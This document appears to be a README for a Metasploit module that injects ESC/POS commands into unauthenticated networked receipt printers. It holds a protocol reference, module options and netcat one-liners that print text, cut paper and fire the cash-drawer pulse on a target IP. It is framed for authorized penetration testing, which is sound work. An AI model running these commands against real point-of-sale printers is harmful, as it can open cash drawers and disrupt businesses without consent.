# ESC/POS Printer Command Injector

This document provides in-depth technical documentation for the `esc_pos_printer_command_injector` Metasploit auxiliary module. It serves as a comprehensive resource for security researchers and penetration testers aiming to understand, utilize, and extend the module's capabilities. This guide includes a detailed explanation of the underlying ESC/POS protocol, a broad reference of common commands, and a complete user manual for the module, emphasizing its ethical use for vulnerability research and network auditing.

## 1. Project Overview

The `esc_pos_printer_command_injector` is a specialized tool designed to interact with networked receipt printers that use the ESC/POS command set. This module exploits a fundamental design flaw in these devices: the lack of authentication on the standard printing port (typically `9100`). By sending raw, unauthenticated commands, a user can manipulate the printer's physical and internal state, bypassing normal application-level controls.

This project goes beyond a simple proof-of-concept. It is a robust and flexible tool for:
* **Vulnerability Assessment:** Identifying misconfigured or legacy printers on a network.
* **Protocol Analysis:** Understanding how specific commands and data sequences affect a printer's behavior.
* **Physical Security Auditing:** Demonstrating how network access to a printer can lead to tangible, real-world impacts, such as triggering a cash drawer.

The module's design focuses on modularity, allowing for the easy addition of new features and command injections in the future.

## 2. Understanding the ESC/POS Protocol

ESC/POS (Epson Standard Code for Printers) is a binary protocol, meaning it communicates using a series of non-printable control characters and data bytes. It is the de facto standard for controlling thermal and dot-matrix receipt printers.

### Binary Communication
Unlike text-based protocols like HTTP, where data is human-readable, ESC/POS commands are typically a sequence of hexadecimal values. The most important of these is the **Escape** character, represented by the hexadecimal value `\x1B`. This character acts as a command prefix. When the printer's firmware receives `\x1B`, it understands that the following bytes are not to be printed as text but should be interpreted as a specific command to perform an action.

### Command Structure
A typical ESC/POS command sequence follows a simple pattern:
`[Command Prefix]` + `[Command Byte]` + `[Optional Data]`

For example, to force a paper cut, a command sequence might be `\x1B\x69`. Here, `\x1B` is the prefix, and `\x69` is the command byte that tells the printer to cut the paper. The command may or may not be followed by a series of data bytes that provide additional parameters.

Another important command prefix is **Group Separator**, or `GS`, which has the hexadecimal value `\x1D`. `GS` commands are often used for more advanced features like printing barcodes or images.

## 3. General List of ESC/POS Commands

This is a comprehensive reference of commands that can be used to interact with a wide range of ESC/POS compatible printers. This list is not exhaustive but covers the most common and useful commands for a security researcher.

| Command | Hex | Description |
| :--- | :--- | :--- |
| **Printer Control Commands** | | |
| `ESC @` | `1B 40` | Initializes the printer, clearing all buffer data and resetting all settings to their defaults. This is a crucial command to start a new print job cleanly. |
| `ESC M n` | `1B 4D n` | Selects a character font. `n` can be `0` for Font A or `1` for Font B. |
| `GS V \x01` | `1D 56 01` | **Full Cut:** Feeds paper to the cut position and performs a full cut. |
| `ESC i` | `1B 69` | **Full Cut:** Another widely-used command for a full cut. |
| `ESC d n` | `1B 64 n` | **Feed Lines:** Feeds `n` lines of paper. The value of `n` is specified as a single byte. For example, `ESC d \x05` feeds 5 lines. |
| `ESC J n` | `1B 4A n` | **Feed Dots:** Feeds paper `n` dots. A more precise version of the line feed command. |
| **Drawer Control Commands** | | |
| `ESC p m t1 t2` | `1B 70 m t1 t2` | **Open Drawer:** Fires the pulse to open the cash drawer. `m` selects the drawer, and `t1` and `t2` define the pulse duration in milliseconds. |
| **Text Formatting Commands** | | |
| `ESC ! n` | `1B 21 n` | **Select Print Mode:** Enables various text attributes like bold, double-height, and double-width. `n` is a bit-flag value. For example, `\x08` for double-height, `\x10` for double-width. |
| `ESC a n` | `1B 61 n` | **Justification:** Aligns the text. `n` can be `\x00` (left), `\x01` (center), or `\x02` (right). |
| `ESC - n` | `1B 2D n` | **Underline Mode:** Turns underlining on or off. `n` can be `0` (off) or `1` (on). |
| `ESC E n` | `1B 45 n` | **Bold Mode:** Turns bold printing on or off. `n` can be `0` (off) or `1` (on). |
| **Barcode and Image Commands** | | |
| `GS k m` | `1D 6B m` | **Print Barcode:** This is a complex command to print various types of 1D barcodes. `m` selects the barcode type. |
| `GS ( k` | `1D 28 6B` | **Print 2D Barcode (QR Code):** Used for printing QR codes. This command requires additional data to specify the size and content of the code. |
| `GS v 0` | `1D 76 30` | **Print Bit Image:** Prints a bit image (raster graphics). The data that follows specifies the image dimensions and pixel data. |

## 4. Module Options and Usage

This module is designed for use within the Metasploit Framework. To get started, load the module and set the necessary options.

### Module Configuration
Run `show options` to see all available parameters:
```
msf6 > use auxiliary/scanner/misc/esc_pos_printer_command_injector
msf6 auxiliary(scanner/misc/esc_pos_printer_command_injector) > show options

```

**Key Options**

    RHOSTS (Target IP): The IP address of the target printer. This is the only mandatory option.

    RPORT (Target Port): The port used for communication (default is 9100).

    MESSAGE: The text string you want to print.

    PRINT_MESSAGE: A boolean flag to print the message.

    TRIGGER_DRAWER: A boolean flag to activate the cash drawer.

    CUT_PAPER: A boolean flag to feed and cut the paper.

    FEED_LINES: An integer to specify how many lines to feed before cutting.

    DRAWER_COUNT: An integer to specify how many times to pulse the cash drawer.

**Example Usage**

Here are a few usage examples demonstrating the module's versatility:

**Basic Message Injection**

This will send a simple, sanitized message to the printer.

```
msf6 > set RHOSTS 192.168.1.100
msf6 > set PRINT_MESSAGE true
msf6 > set MESSAGE "WARNING: PRINTER COMPROMISED"
msf6 > run
```

**Triggering the Cash Drawer**

This will send the cash drawer pulse command, with no other actions.
```
msf6 > set RHOSTS 192.168.1.100
msf6 > set TRIGGER_DRAWER true
msf6 > set DRAWER_COUNT 3
msf6 > run
```
**Full Receipt Simulation**

This will print a message, feed the paper, and cut it, simulating a full receipt.
```
msf6 > set RHOSTS 192.168.1.100
msf6 > set PRINT_MESSAGE true
msf6 > set MESSAGE "Audit complete. This device is vulnerable."
msf6 > set CUT_PAPER true
msf6 > set FEED_LINES 10
msf6 > run

```
### 5. Testing from a Linux Terminal (Without Metasploit)

While the module is designed for the Metasploit Framework, you can replicate its core functionality and test a printer's vulnerability directly from a standard Linux terminal. This method uses the `netcat` utility (`nc`), which is a powerful tool for reading from and writing to network connections. This approach is ideal for quick, low-level testing of raw command injection.

#### Prerequisites
- A Linux or macOS system with `netcat` installed.
- The target printer's IP address and port (defaulting to `9100`).

#### The `echo -ne` Command
The key to sending raw commands is to use `echo` with the `-n` and `-e` flags:
- `-n`: Prevents `echo` from appending a newline character to the output.
- `-e`: Enables the interpretation of backslash escapes, allowing you to use hexadecimal values like `\x1B` for the ESCAPE character.

#### Pipelining to `netcat`
You will pipe the output of `echo` directly to `netcat`, which then sends the raw data to the printer's IP and port. The command structure is:
`echo -ne "[ESC/POS command]" | nc [Printer IP] [Port]`

#### Example Test Cases

#### Test 1: Print a Message

This will initialize the printer, print a simple message, and then feed a few lines of paper to make it readable.

    echo -ne "\x1B@Hello, World!\x0A\x0A\x0A" | nc 192.168.1.100 9100


- \x1B@ is the initialize command.

- Hello, World! is the message.

- \x0A is the newline character.

#### 2: Trigger the Cash Drawer

This sends the command to open a cash drawer connected to the printer's cash drawer port.

    echo -ne "\x1B\x70\x00\x19\x19" | nc 192.168.1.100 9100


- \x1B\x70 is the cash drawer command prefix.

The \x00\x19\x19 bytes define the specific drawer and the pulse duration.

#### Test 3: Force a Paper Cut

This sends the most common command to cut the paper. The printer will feed the paper to the cut position and then perform a full cut.

    echo -ne "\x1B\x69" | nc 192.168.1.100 9100

- \x1B\x69 is the command for a full paper cut.

<br>
<br>

### Helpful Links 

#### Epson Command Reference Revision 3.40
- https://download4.epson.biz/sec_pubs/pos/reference_en/escpos/index.html
<br>
<br>
<br>

### 6. Ethical Guidelines and Disclaimer

This software is intended solely for educational, research, and authorized penetration testing purposes. It is a powerful tool for demonstrating the security risks associated with unauthenticated protocols in common IoT devices.

Under no circumstances should this tool be used on any network or device without explicit, written permission from the owner. Unauthorized use may be a violation of federal and local laws.

The author and contributors of this module are not responsible for any misuse, damage, or legal consequences that may arise from its use. By using this software, you agree to assume all responsibility for your actions.

